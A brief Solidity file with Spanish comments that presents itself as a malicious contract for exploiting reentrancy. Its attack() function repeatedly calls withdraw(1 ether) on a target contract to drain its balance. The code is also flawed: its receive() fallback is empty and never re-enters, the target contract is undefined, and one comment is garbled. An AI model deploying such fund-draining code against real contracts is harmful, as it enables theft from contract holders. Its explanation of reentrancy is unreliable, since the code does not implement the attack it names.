// Contrato malicioso para explotar la reentrancia
pragma solidity ^0.8.0;

contract MaliciousContract {
    ReentrancyVulnerableContract private vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = ReentrancyVulnerableContract(_vulnerableContractAddress);
    }

    function attack() public payable {
        // Llamar repetidamente a la funciÃ³n withdraw del contrato vulnerable
        while (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    receive() external payable {
        // Realizar acciones adicionales en cada llamada
        // Puede incluir transferencias de fondos adicionales
    }
}
